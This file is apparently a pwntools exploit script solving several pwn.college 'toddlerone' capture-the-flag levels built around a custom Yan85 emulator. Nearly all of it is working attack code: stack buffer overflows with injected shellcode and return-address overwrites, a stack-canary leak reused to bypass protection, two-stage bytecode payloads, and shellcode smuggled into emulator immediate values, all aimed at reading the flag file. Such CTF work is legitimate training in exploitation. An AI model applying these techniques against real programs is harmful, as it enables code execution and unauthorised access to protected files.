import os
import pwn
import re
import sys

from yan85_interpreter import CPU

pwn.context.log_level = 'error'
pwn.context.terminal = ['kitty']

class Level:
    def __init__(self, hostname):
        self.level = hostname.split('~')[1].replace('level', '').replace('-','.').splitlines()[0] \
            if '~' in hostname \
            else hostname
        self.remote_process = f"/challenge/toddlerone_level{self.level}"
        self.local_process = f"binaries/toddlerone_level{self.level}"
        self.func_name = f"level{self.level.replace('.', '_')}"
        self.run = globals()[self.func_name]

def _memcmp(level):
    binary = level.local_process
    cpu = CPU(binary)

    code = cpu.decomp('execute_program').splitlines()
    mem_idx = 0
    for line in code:
        if 'memcmp' in line:
            pattern = r'\+ (\d+)'
            match = re.search(pattern, line)
            if match:
                mem_idx = int(match.group(1))
                break

        elif 'cpu' in line:
            exec(line.strip())

    return bytes(cpu.memory[mem_idx:])

def _extract_memory(level, bp1, bp2):
    binary = level.local_process
    cpu = CPU(binary)
    code = cpu.decomp('execute_program').splitlines()[9:]
    linenum = 0
    mem_idx = 0
    for line in code:
        print(f"{linenum}:{line}")
        exec(line.strip())
        if linenum == bp1:
            match = re.search(r'cpu.imm\(\d+, (\d+)\)', line)
            if match:
                mem_idx = int(match.group(1))
                print(f"MEM_IDX: {mem_idx}")

        if linenum == bp2:
            print(cpu.memory[mem_idx:])
            return bytes(cpu.memory[mem_idx:])
        linenum += 1

def _generate_bytecode(level, filename):
    with open(filename, 'r') as f:
        y85 = f.read()

    binary = level.local_process
    cpu = CPU(binary)
    bytecode = cpu.to_bytecode(y85)
    return bytecode

def to_y85_64(yan85, regs, ins, ord):
    output = []
    lines = yan85.splitlines()
    for line in lines:
        line = line.replace('*', '').replace('= ', '').lower()
        opcode, arg1, arg2 = line.split(' ')

        op = ins[opcode]

        if opcode == 'jmp':
            a1 = 0
        else:
            a1 = regs[arg1]

        if arg2 in regs:
            a2 = regs[arg2]
        else:
            a2 = int(arg2, 16)

        insn = [0, 0, 0]
        insn[ord['op']] = pwn.p64(op)
        insn[ord['arg1']] = pwn.p64(a1)
        insn[ord['arg2']] = pwn.p64(a2)

        output.extend(insn)

    return b''.join(output)

def level7_0(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    bufaddr = 0xb0
    retaddr = 0x110
    jmp = 0x7fffffffb990

    shellcode = get_shellcode('sendfile.s')
    bc = _generate_bytecode(level, 'code/overflow.y85')

    p.send(bc)
    shellcode += b"A" * (retaddr-bufaddr-len(shellcode)+8)
    shellcode += pwn.p64(jmp)
    p.send(shellcode)
    print(p.recvall(timeout=1).decode())

def level7_1(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    bufaddr = 0xb0
    retaddr = 0x110
    jmp = 0x7fffffffb990

    shellcode = get_shellcode('sendfile.s')
    bc = _generate_bytecode(level, 'code/overflow.y85')

    p.send(bc)
    shellcode += b"A" * (retaddr-bufaddr-len(shellcode)+8)
    shellcode += pwn.p64(jmp)
    p.send(shellcode)
    print(p.recvall(timeout=1).decode())

def level8_0(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    bufaddr = 0xb0
    canaddr = 0x100
    retaddr = 0x110

    shellcode = get_shellcode('sendfile.s')
    bc = _generate_bytecode(level, 'code/lvl8_0.y85')

    p.send(bc)
    p.recvuntil(b"... write\n")

    data = p.recvuntil(b"[s]").split(b'[')[0][9:]
    canary = data[:8]
    stackaddr = data[8:]
    print(f"Canary: {hex(pwn.u64(canary))}")
    print(f"Stack Addr: {hex(pwn.u64(stackaddr))}")

    jmp = pwn.u64(stackaddr) - 0x100
    shellcode += b"A" * (canaddr-bufaddr-len(shellcode)+8)
    shellcode += canary
    shellcode += b"B" * (retaddr - canaddr - 8)
    shellcode += pwn.p64(jmp)
    p.send(shellcode)
    print(p.recvall(timeout=1).decode())

def level8_1(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    bufaddr = 0xb0
    canaddr = 0x100
    retaddr = 0x110

    shellcode = get_shellcode('sendfile.s')
    bc = _generate_bytecode(level, 'code/lvl8_0.y85')

    p.recvuntil(b"yancode: ")
    p.send(bc)
    p.recvuntil(b"luck!\n")

    data = p.recv()[9:]
    canary = data[:8]
    stackaddr = data[8:]
    print(f"Canary: {hex(pwn.u64(canary))}")
    print(f"Stack Addr: {hex(pwn.u64(stackaddr))}")

    jmp = pwn.u64(stackaddr) - 0x100
    shellcode += b"A" * (canaddr-bufaddr-len(shellcode)+8)
    shellcode += canary
    shellcode += b"B" * (retaddr - canaddr - 8)
    shellcode += pwn.p64(jmp)
    p.send(shellcode)
    print(p.recvall(timeout=1).decode())

def level9_0(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)

    stg1 = _generate_bytecode(level, 'code/lvl9_0.y85')
    stg2 = _generate_bytecode(level, 'code/open_flag.y85')

    p.recvuntil(b"yancode: ")
    p.send(stg1)
    p.recvuntil(b"read_memory\n")
    p.send(b"\x05" + stg2)
    p.recvuntil(b"... write\n")
    print(p.recvline().decode())

def level9_1(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)

    stg1 = _generate_bytecode(level, 'code/lvl9_0.y85')
    stg2 = _generate_bytecode(level, 'code/open_flag.y85')

    p.recvuntil(b"yancode: ")
    p.send(stg1)
    p.recvuntil(b"luck!\n")
    p.send(b"\x05" + stg2)
    print(p.recvall(timeout=1).decode())

def level10_0(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)

    stg1 = _generate_bytecode(level, 'code/lvl10_0.y85')

    p.recvuntil(b"yancode: ")
    p.send(stg1)
    p.recvall(timeout=1)

def level10_1(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)

    stg1 = _generate_bytecode(level, 'code/lvl10_1.y85')

    p.recvuntil(b"yancode: ")
    p.send(stg1)
    p.recvall(timeout=1)

def level11_0(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)

    with open('code/lvl11_0.y85', 'r') as f:
        y85 = [line.strip() for line in f.readlines()]

    with open('sendfile_small.s', 'r') as f:
        a = f.readlines()

    for line in a:
        asm = pwn.asm(line, arch='amd64')
        ycode = asm + b'\x90'*(6-len(asm)) + b'\xeb\x09'
        y85.append(f"IMM a = 0x{pwn.u64(ycode):016x}")

    regs = {
        'a': 0x01,
        'c': 0x40,
        'd': 0x02,
    }

    ins = {
        'imm': 0x08,
        'stm': 0x02,
    }

    ord = {'op': 1, 'arg1': 2, 'arg2': 0}
    bc = to_y85_64('\n'.join(y85), regs, ins, ord)

    p.recvuntil(b"yancode: ")
    p.sendline(bc)
    output = p.recvall(timeout=1).split(b'\n')
    flag = output[-2].decode()
    print(flag)

def level11_1(level, p):
    elf = pwn.context.binary = pwn.ELF(level.local_process)

    with open('code/lvl11_0.y85', 'r') as f:
        y85 = [line.strip() for line in f.readlines()]

    with open('sendfile_small.s', 'r') as f:
        a = f.readlines()

    for line in a:
        asm = pwn.asm(line, arch='amd64')
        ycode = asm + b'\x90'*(6-len(asm)) + b'\xeb\x09'
        y85.append(f"IMM a = 0x{pwn.u64(ycode):016x}")


    regs = {
        'a': 0x04,
        'c': 0x40,
        'd': 0x02,
    }

    ins = {
        'imm': 0x08,
        'stm': 0x80,
    }

    ord = {
        'op': 1,
        'arg1': 0,
        'arg2': 2
    }

    bc = to_y85_64('\n'.join(y85), regs, ins, ord)

    p.recvuntil(b"yancode: ")
    p.sendline(bc)
    flag = p.recvall(timeout=1).decode()
    print(flag)


def get_level(r):
    p = r.process("hostname")
    hostname = p.recvall(timeout=1).decode()
    level = Level(hostname)
    print(f"LEVEL {level.level}")
    return level

def get_shellcode(asm_file):
    assembly = []
    with open(asm_file, 'r') as f:
        for line in f.readlines():
            assembly.append(line.split('#')[0].rstrip())

    return pwn.asm('\n'.join(assembly))

if __name__ == '__main__':

    level = Level(sys.argv[2])

    # Used in level 10
    os.dup2(1, os.path.getsize('/flag'))

    if len(sys.argv) == 3 and sys.argv[1] == 'local':
        p = pwn.process(level.local_process, aslr=False, close_fds=False)

    elif len(sys.argv) >= 4 and sys.argv[1] == 'dbg':
        gdbscript = []
        for arg in sys.argv[3:]:
            gdbscript.append(arg)
        gdbscript = '\n'.join(gdbscript)
        p = pwn.gdb.debug(level.local_process, gdbscript=gdbscript, stdin=pwn.PTY, stdout=pwn.PTY, aslr=False, close_fds=False)

    elif sys.argv[1] == 'remote':
        r = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
        level = get_level(r)
        p = r.process(level.remote_process)

    elif sys.argv[1] == 'local':
        r = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
        level = get_level(r)
        p = pwn.process(f"binaries/toddlerone_level{level.level}")

    else:
        print(f"Usage: {sys.argv[0]} <remote|local> (level)")
        exit()

    with p:
        level.run(level, p)

